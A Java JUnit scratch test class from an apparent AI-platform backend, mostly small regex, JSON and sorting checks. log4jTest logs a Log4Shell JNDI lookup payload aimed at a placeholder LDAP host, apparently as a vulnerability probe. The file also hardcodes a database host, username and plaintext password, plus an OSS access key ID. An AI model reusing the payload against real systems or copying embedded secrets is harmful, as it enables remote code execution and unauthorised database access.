package com.tigerobo.pai.biz.test.common.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.tigerobo.x.pai.biz.constant.SkuConstant;
import com.tigerobo.x.pai.biz.message.MessageSender;
import com.tigerobo.x.pai.biz.utils.DownloadImageUtil;
import com.tigerobo.x.pai.biz.utils.RestUtil;
import com.zaxxer.hikari.HikariConfig;
import com.zaxxer.hikari.HikariDataSource;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.StringUtils;

import org.junit.Test;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.*;
import java.util.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

@Slf4j
public class CommonTest {

    String jdbcUrl = "jdbc:mysql://rm-uf667v51y508p3m9x.mysql.rds.aliyuncs.com:3306/x_pai?useUnicode=true&characterEncoding=UTF8&autoReconnect=true&zeroDateTimeBehavior=convertToNull&serverTimezone=Asia/Shanghai";


    String username = "x_pai";
    String password = "b2LttrJEKj";
    String driverClassName = "com.mysql.cj.jdbc.Driver";


    @Test
    public void mapTest(){

        Map<String,String> map = new LinkedHashMap<>();
        map.put("爱国","爱中国");
        map.put("我们?的国家?","中国");


        System.out.println(JSON.toJSONString(map));
        String text = "我的国家";

        for (Map.Entry<String, String> entry : map.entrySet()) {
            text = text.replaceAll(entry.getKey(), entry.getValue());
        }
        System.out.println(text);
    }

    @Test
    public void regexTest(){


        List<String> list = new ArrayList<>();

        String reg = "画.+";

        list.add(reg);
        list.add(".*[给帮]我(做幅)?画.*");
        list.add(".*怎么画.*");

        System.out.println(JSON.toJSONString(list));

        String text = "画图一条龙";
        System.out.println(text.matches(reg));

    }

    @Test
    public void ignoreTest(){

        String text = "hello Hello Test gpt3.5";

        System.out.println(text.replaceAll("(?i)Gpt3.5","sD"));
    }

    @Test
    public void strReplaceTest(){

        String content = "<p>Verstappen goes fastest in final Japanese GP practice https://t.co/cVTEFPQxLW</p><img src=\"http://ipo-oss.aigauss.com/twitter/Reuters/1578616239865356293/a85ce595d0b40be84aa8f5f5ac93455b.jpg\" height=\"140\" width=\"250\" />";
        final String target = content.replaceAll("http://ipo-oss\\.aigauss\\.com", "https://ipo-oss.aigauss.com");


        System.out.println(target);

    }
    @Test
    public void jdbcTest(){

        try(final Connection connection = DriverManager.getConnection(jdbcUrl, username, password);
            final Statement statement = connection.createStatement();
        ){
            String sql = "select count(1) from aml_model";
            final ResultSet resultSet = statement.executeQuery(sql);

            while (resultSet.next()){
                final int anInt = resultSet.getInt(1);
                System.out.println(anInt);
            }

        }catch (Exception ex){
            ex.printStackTrace();
        }

    }

    @Test

    public void fileTest()throws Exception{

        String tmpdir = System.getProperty("java.io.tmpdir");
        System.out.println(tmpdir);

        final long l = System.currentTimeMillis();
        final Path path = Paths.get(tmpdir, "art_"+l+ ".txt");


        final Path file = Files.createFile(path);

        Files.delete(file);


    }

    @Test
    public void avlTest(){

    }

    @Test

    public void fileTest2(){
        String v = "\u6a21 \u578b \u672a \u90e8 \u7f72 \uff01";
        System.out.println(v);

    }
    @Test
    public void lockTest(){


        Lock lock = new ReentrantLock();

    }
    @Test
    public void ossList(){

        String text = "[{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/\",\"id\":1},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/6UUDpMJELZ48LqeRABv8.jpg\",\"id\":2},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/8M91dfgcXMhpbiLjkWIX.jpg\",\"id\":3},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/8z1WDADviKuQFqx48MTh.jpg\",\"id\":4},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/Bitcoin Goddess - Beeple.jpg\",\"id\":5},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/C0ijouVOs3H8hD3wFxZQ.jpg\",\"id\":6},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/C6Hd3uE9HjFmUNJUjpf4.jpg\",\"id\":7},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/Emdt9Zc0yhVNGV8oaHS7.jpg\",\"id\":8},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/EvRzUNtkH1Qh1RDqoz8W.jpg\",\"id\":9},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/FA7TROMFQ6xLwbKFFxb9.jpg\",\"id\":10},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/FZOKFdHjYWL4oKUkQaOZ.jpg\",\"id\":11},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/GuokulRk6bCVZ9XekgaS.jpg\",\"id\":12},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/H3QpyJnBclPidG2Opquz.jpg\",\"id\":13},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/H45axtJUugvTdQNniufn.jpg\",\"id\":14},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/HZoWjUD4xUbS68VwxKfZ.jpg\",\"id\":15},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/J4GVtHU54IQyeTNDsOAT.jpg\",\"id\":16},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/JBlYta3TzInEnFSCKTYc.jpg\",\"id\":17},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/JoZt6DOoGVvvjrM8d4WF.jpg\",\"id\":18},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/Jxqdm5RFbs0ULVfj3vNm.jpg\",\"id\":19},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/MEgo7e1oYtTLmt5JOHeo.jpg\",\"id\":20},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/NBkI6TjfJJbx0jaVQ6S5.jpg\",\"id\":21},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/OMidk43gw2QS04jxfePU.jpg\",\"id\":22},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/PaoF0K2iy9uXD8Y3ipGE.jpg\",\"id\":23},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/Shipwreck.jpg\",\"id\":24},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/SsCmIuFKa6XFjowyDchR.jpg\",\"id\":25},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/SykF1mcn73B3u3Qrcg7Y.jpg\",\"id\":26},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/T1UtsLiTVhHAPLNCCkYx.jpg\",\"id\":27},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/VhyEEV3BLu8eeWxewOcu.jpg\",\"id\":28},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/WH7PyDDuQ3QdsR84rXZ7.jpg\",\"id\":29},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/YUHf3xhqehzNcPsDVTbL.jpg\",\"id\":30},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/YwsT1MSrLyLYoOvdbnGB.jpg\",\"id\":31},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/ZyhOMPOCDpdw8HlMYgtF.jpg\",\"id\":32},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/aQzZtREIzHcxmrBuWLyo.jpg\",\"id\":33},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/ah0esJJJUbaBAKUzTutj.jpg\",\"id\":34},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/dnskDrGYa7iuLRE9M8zk.jpg\",\"id\":35},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/dolomiten.jpg\",\"id\":36},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/duwlFySwghCw6shsp9JZ.jpg\",\"id\":37},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/e2LMOV2MslRldLPRKgML.jpg\",\"id\":38},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/gIzWDnMSH5dVL3NiJzsN.jpg\",\"id\":39},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/gojkrZGN3IhVjhaeRfu1.jpg\",\"id\":40},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/h43maxx0spSBU9k1Q2VR.jpg\",\"id\":41},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/i4YUzR8KQ8NtqNpPnNj2.jpg\",\"id\":42},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/jH0Nko52LslvV4I0fAtH.jpg\",\"id\":43},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/jcDYw8dCcjtoTuI03DPX.jpg\",\"id\":44},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/jlicrHq7Ui5wCFHdJZ4t.jpg\",\"id\":45},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/kandinsky.jpg\",\"id\":46},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/marliyn_1967_andy-warhol.jpeg\",\"id\":47},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/meywyyiBScaqpJqQHej9.jpg\",\"id\":48},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/mulberry tree.jpg\",\"id\":49},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/n2ephCUTghISlEoStf4Y.jpg\",\"id\":50},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/njJWZMYte8qFuwEckB9F.jpg\",\"id\":51},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/orchidae.jpg\",\"id\":52},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/oznKWrWcbQNVwmmLDjRm.jpg\",\"id\":53},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/rwUtXziVyEdbFETdYSCT.jpg\",\"id\":54},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/the great wave.jpg\",\"id\":55},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/the night cafe.jpg\",\"id\":56},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/ttNZ4ptMnoc1RgpqQVHb.jpg\",\"id\":57},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/vnqO5hDWWrKfqYYwowWh.jpg\",\"id\":58},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/w8ODkhUND3Gz1HBrMySv.jpg\",\"id\":59},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/wwUee71xirvCw8p8fpOg.jpg\",\"id\":60},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/xRBL8q9MoEtUkQtlgSwZ.jpeg\",\"id\":61},{\"styleImage\":\"https://x-pai.algolet.com/model/style_transfer/style_image/ysJgE6rCIpgr9gx6zyiH.jpg\",\"id\":62}]";

        final JSONArray objects = JSON.parseArray(text);
        for (Object object : objects) {
            System.out.println(JSON.toJSONString(object));
        }

    }
    @Test
    public void hikariTest() throws Exception{
        HikariConfig config = new HikariConfig();
        HikariDataSource ds = null;
        config.setJdbcUrl(jdbcUrl);
        config.setUsername(username);
        config.setPassword(password);
        config.setDriverClassName("com.mysql.cj.jdbc.Driver");
        config.addDataSourceProperty("cachePrepStmts", "true");
        config.addDataSourceProperty("prepStmtCacheSize", "250");
        config.addDataSourceProperty("prepStmtCacheSqlLimit", "2048");
        ds = new HikariDataSource(config);

        try(Connection connection = ds.getConnection()){
            String sql = "select count(1) n from aml_info";
            final PreparedStatement preparedStatement = connection.prepareStatement(sql);

            final ResultSet resultSet = preparedStatement.executeQuery();

            while (resultSet.next()){
                System.out.println(resultSet.getInt(1));
            }
        }


    }

    @Test
    public void priceTest(){

        LinkedHashMap<Long, BigDecimal> periodPriceMap = new LinkedHashMap<>();

        periodPriceMap.put(0L,new BigDecimal(8));
        periodPriceMap.put(10L,new BigDecimal("7.5"));
        periodPriceMap.put(100L,new BigDecimal("7"));
        periodPriceMap.put(500L,new BigDecimal("6.5"));
        periodPriceMap.put(1000L,new BigDecimal("6"));
        periodPriceMap.put(5000L,new BigDecimal("5.5"));
        periodPriceMap.put(10000L,new BigDecimal("5"));


        Map<String,Object> map = new LinkedHashMap<>();
        map.put(SkuConstant.REGION_PRICE,periodPriceMap);


        System.out.println(JSON.toJSONString(map));
    }
    @Test
    public void isRegMatchTest(){
        String text = "china is ok";

        boolean matches = text.matches("\\w+");
        System.out.println(matches);
    }

    @Test
    public void sendTest(){
        MessageSender.sendCode(null,"18301966691","2345",null);
    }


    @Test
    public void downloadTest(){


        String url = "https://x-pai.algolet.com/common/test/2022/13/d64a78213fde70008773680b857f7ff3.png?Expires=1799753407&OSSAccessKeyId=LTAI5t8HoYusAPr5MffHTauz&Signature=kOKwO%2BSA0qU138olC2wwF%2B9Cfok%3D";

        url = "https://x-pai.algolet.com/common/2022/22/9f8a3a982a3bb830171cf6a3ed3497be.jpeg?Expires=1805617974&OSSAccessKeyId=LTAI5t8HoYusAPr5MffHTauz&Signature=ylnU6PbbGqYwXZJR6GlL%2BdmEjPo%3D";

        url = "https://x-pai.algolet.com/model/style_transfer/base/Young%20Girl%20with%20a%20Flowered%20Hat.jpg";
        url = "https://x-pai.algolet.com/model/style_transfer/base/Le Bonheur de Vivre.jpg";
        System.out.println(DownloadImageUtil.getTmpImgFile(url));
    }

    @Test
    public void log4jTest(){

        String name = log.getClass().getName();
        System.out.println(name);
        log.error("${jndi:ldap://ip:1389/#Exploit}");

    }

    @Test
    public void qsTest(){

        int step = 50;

        int max = 400;
        int delta = Math.max(1, max / step / 4);

        List<Integer> progressList = new ArrayList<>();
        for (int i = 0; i <= 4; i++) {
            int plain = i * step * delta;
            if (plain <= max) {
                progressList.add(plain);
            }
        }

        if (!progressList.contains(max)) {
            progressList.add(max);
        }

        System.out.println(JSON.toJSONString(progressList));

    }

    private int ms(int[] list,int target){

        if (list == null||list.length==0){
            return -1;
        }
        int min = 0;
        int max = list.length-1;

        while (min<=max){
            int mid = (min+max)/2;
            int v = list[mid];
            if (v==target){
                return mid;
            }else if (target<v){
                max = mid-1;
            }else {
                min = mid+1;
            }
        }
        return -1;

    }
    private List<Integer> qs(List<Integer> arr){

        if (arr == null||arr.size()<=1){
            return arr;
        }
        List<Integer> preList = new ArrayList<>();
        List<Integer> sameList = new ArrayList<>();
        List<Integer> afterList = new ArrayList<>();

        Integer base = arr.get(0);
        for (Integer item : arr) {
            if (base.equals(item)){
                sameList.add(item);
            }else if (item.compareTo(base)>0){
                afterList.add(item);
            }else {
                preList.add(item);
            }
        }

        List<Integer> targetList = new ArrayList<>();
        targetList.addAll(qs(preList));
        targetList.addAll(sameList);
        targetList.addAll(qs(afterList));
        return targetList;
    }


    private void qsM(int[] arr,int low,int high){
        if (low<high){
            int partition = partition(arr, low,high);
            qsM(arr,low,partition-1);
            qsM(arr,partition+1,high);
        }
    }
    private int partition(int[] arr,int low,int high){
        int pivot = arr[high];
        int pointer = low;

        for (int i = low; i <high; i++) {
            if (arr[i]<=pivot){
                swap(arr,pointer,i);
                pointer++;
            }
        }
        swap(arr,high,pointer);
        return pointer;
    }

    private void swap(int[] arr,int i,int j){
        int tmp = arr[i];
        arr[i] = arr[j];
        arr[j] = tmp;
    }



    @Test
    public void joinListTest(){

        List<Integer> list= new ArrayList<>();

        Random random = new Random(200);
        for (int i = 0; i < 100; i++) {
            int v = random.nextInt(100);
            list.add(v);
        }
        Integer[] arr = new Integer[list.size()];
        list.toArray(arr);
        Arrays.sort(arr);

        System.out.println(list);
        System.out.println(JSON.toJSONString(arr));
    }


    @Test
    public void lengthTest(){

        String url = "https://x-pai.algolet.com/biz/blog/user/cc4a47c05ace478cae2be3c02f9260e7_7.html";

        String s = RestUtil.get(url, new HashMap<>());
        System.out.println(s);
    }
    @Test
    public void jsonPrint(){


        String url = "biz/blog/user/2e7af6ee1b7e4e918c1a0bc2f937cf5f_1.html";

        System.out.println(buildOssUrlVersion(url));

    }

    private String buildOssUrlVersion(String oss){
//        if (StringUtils.isBlank(oss)){
//            return productHtmlPath();
//        }
        int index = oss.lastIndexOf(".");

        String substring = oss.substring(index);

        String pre = oss.substring(0, index);

        String[] s = pre.split("_");
        String head = s[0];
        int version = 1;
        if (s.length>1){
            String versionStr = s[1];
            if (!StringUtils.isBlank(versionStr)&&versionStr.matches("\\d+")){
                version = Integer.parseInt(versionStr)+1;
            }
        }

        return head+"_"+version+substring;

    }
    @Test
    public void transTest(){
        String s= "{\n" +
                "    \"text_list\":[\n" +
                "        \"There has been a rising number ofAI jobsin government agencies around the world.\",\n" +
                "        \"The government and public sector stand to gain exceptional benefits from the integration ofAIin its daily operations. As artificial intelligence and machine learning gain momentum, an increasing number of government agencies have also started to useAItools to improve decision-making and national security. The use of AI in government must take into account privacy and security, compatibility with legacy systems, and evolving workloads. The heart of AI in government services involves techniques like deep learning, computer vision, speech recognition, and robotics. Also, cyber anomaly detection can revolutionize cyber strategies in defense systems. To utilize these advanced technologies, government agencies from around the world are employing skilled and experienced AI professionals. In this article, we have listed 10AIjobs that are available right now in these agencies.\",\n" +
                "        \"Data Scientist\",\n" +
                "        \"Offered by: Canadian Security Intelligence Service\",\n" +
                "        \"Location: Ottowa, ON\",\n" +
                "        \"The applicants should possess an undergraduate degree in either mathematics, statistics, computer science, or computer engineering. The chosen candidates will have to define, develop, and lead data science programs to identify opportunities and provide solutions and capabilities to address them. They are required to autonomously find, transform, interpret, and leverage the collected data.\",\n" +
                "        \"Business Intelligence Specialist\",\n" +
                "        \"Offered by: Canadian Security Intelligence Service\",\n" +
                "        \"Location: Ottowa, ON\",\n" +
                "        \"This organization is looking for a Business Intelligence Specialist to transform its business solutions as a part of a mission to ensure the safety of all Canadians. Their core responsibilities would include the installation, maintenance, and configuration of business intelligence platforms, and ensuring that all the issues are identified, tracked, and reported promptly.\"\n" +
                "    ]\n" +
                "}";

        System.out.println(s);
    }

    @Test
    public void blogReplyStrTest(){

        String s = "[{\"spec_id\": \"1458819282960150528\", \"author\": \"kunal singh\", \"author_id\": \"kps_777\", \"publish_time\": \"2021-11-11 23:29:55\", \"content\": \"<p>Never buy a storage device from @Flipkart as they themselves don't know the service center if any support required.  My pen drive gone faulty in 6 months now I am unable to find a way get support and it have 3 years Warranty. What a joke...</p>\"}, {\"spec_id\": \"1458819966610907136\", \"author\": \"FlipkartSupport\", \"author_id\": \"flipkartsupport\", \"publish_time\": \"2021-11-11 23:32:38\", \"content\": \"<p>@kps_777 Sorry to hear this. We'd definitely like to check this for you. Request you to share the order ID that you are referring to so that we could assist you further. (1/2)</p>\"}, {\"spec_id\": \"1459438451250630657\", \"author\": \"kunal singh\", \"author_id\": \"kps_777\", \"publish_time\": \"2021-11-13 16:30:16\", \"content\": \"<p>@flipkartsupport I don't want return I want warranty support of the product.  This @HP pen drive contain 3 years warranty.  But you guys are unable to share extect address where I can get the support. Your customer care are sharing toll free no. And there is no option for pen drive support.</p>\"}, {\"spec_id\": \"1459440700316012548\", \"author\": \"HP\", \"author_id\": \"HP\", \"publish_time\": \"2021-11-13 16:39:12\", \"content\": \"<p>@kps_777 Hi Kunal, Thank you for sharing your details via DM. Our support team will get connected with you shortly.\\n\\nAppreciate your support\\n\\n^\\nRajshekar https://t.co/fPjB4sQbHL</p>\"}, {\"spec_id\": \"1460146185457467395\", \"author\": \"kunal singh\", \"author_id\": \"kps_777\", \"publish_time\": \"2021-11-15 15:22:33\", \"content\": \"<p>@HP No response yet. Waiting</p>\"}, {\"spec_id\": \"1460147305617653762\", \"author\": \"HP\", \"author_id\": \"HP\", \"publish_time\": \"2021-11-15 15:27:00\", \"content\": \"<p>@kps_777 We request you to reach out to us over a direct message and our team will look into it.\\n^Kiran https://t.co/fPjB4sQbHL</p>\"}, {\"spec_id\": \"1460945470230974467\", \"author\": \"kunal singh\", \"author_id\": \"kps_777\", \"publish_time\": \"2021-11-17 20:18:37\", \"content\": \"<p>@HP I haven't received any update yet . You just have to share a service center address where I can get support it is taking so long . Why any one will buy thing from @Flipkart</p>\"}, {\"spec_id\": \"1460947543567732744\", \"author\": \"HP\", \"author_id\": \"HP\", \"publish_time\": \"2021-11-17 20:26:52\", \"content\": \"<p>@kps_777 Hi Kunal,\\nGreetings from HP!\\nSorry about the delay.\\nWe see that you are contacting us for the support for the Pen drive you purchased from Flipkart.\\nPlease elaborate on the issue with pen drive and share the invoice copy over DM.\\n^Sajeeda https://t.co/fPjB4sQbHL</p>\"}, {\"spec_id\": \"1461945154021957633\", \"author\": \"kunal singh\", \"author_id\": \"kps_777\", \"publish_time\": \"2021-11-20 14:31:01\", \"content\": \"<p>@HP I have already tagged and informed that the pen drive is not letting me to paste the content in or out of it. I have formated the same still the same</p>\"}, {\"spec_id\": \"1461946126785859587\", \"author\": \"HP\", \"author_id\": \"HP\", \"publish_time\": \"2021-11-20 14:34:52\", \"content\": \"<p>@kps_777 Hi Kunal, we understand your concern. Please direct message us and we can look into it right away.\\n^Kiran https://t.co/fPjB4sQbHL</p>\"}, {\"spec_id\": \"1461956350829752321\", \"author\": \"ajay goyal\", \"author_id\": \"AjayGoyal1990\", \"publish_time\": \"2021-11-20 15:15:30\", \"content\": \"<p>@HP @kps_777 @HP @HPIndia  Never ever I have regretted  anything in life than buying a HP laptop.\\nHve registered a case on 15-11-21 with Case ID 5075789464 & till date all I have got a different excuses, several lies and fake commitments.\\nHave begged,cried,shouted & what nt. A Big thank u 🙏</p>\"}]";

        System.out.println(s);
        JSONArray objects = JSON.parseArray(s);

        for (int i = 0; i < objects.size(); i++) {
            JSONObject jsonObject = objects.getJSONObject(i);

            String spec_id = jsonObject.getString("spec_id");
            String author = jsonObject.getString("author");
            String publish_time = jsonObject.getString("publish_time");
            String content = jsonObject.getString("content");

            System.out.println(spec_id+"\t"+author+"\t"+publish_time+"\t"+content);
        }


    }

    @Test
    public void strTest(){
        String s = "{\"result\":[[{\"score\":0.4610046633409389,\"label\":\"低俗擦边\"},{\"score\":0.2510046683443329,\"label\":\"阅读\"},{\"score\":0.23775800362891314,\"label\":\"淫秽色情\"},{\"score\":0.016322505665948412,\"label\":\"生态不良\"},{\"score\":0.013082898252836529,\"label\":\"其他有害\"},{\"score\":0.011451476412896292,\"label\":\"事故\"},{\"score\":0.0038598928819581456,\"label\":\"政治有害\"},{\"score\":0.003009215501758429,\"label\":\"嘲讽谩骂引战\"},{\"score\":0.0025066759704174316,\"label\":\"黑产恶意刷屏\"}]],\"status\":0}"
;

        JSONObject jsonObject = JSON.parseObject(s);

        JSONArray result = jsonObject.getJSONArray("result");

        for (int i = 0; i < result.size(); i++) {

            JSONArray subArray = result.getJSONArray(i);

            for (int j = 0; j < subArray.size(); j++) {
                JSONObject subJson = subArray.getJSONObject(j);
                BigDecimal score = subJson.getBigDecimal("score");
                if (score!=null){
                    BigDecimal bigDecimal = score.setScale(8, RoundingMode.DOWN);
                    subJson.put("score",bigDecimal);
                }
            }


        }
        System.out.println(JSON.toJSONString(jsonObject));

        System.out.println(s);
    }
}
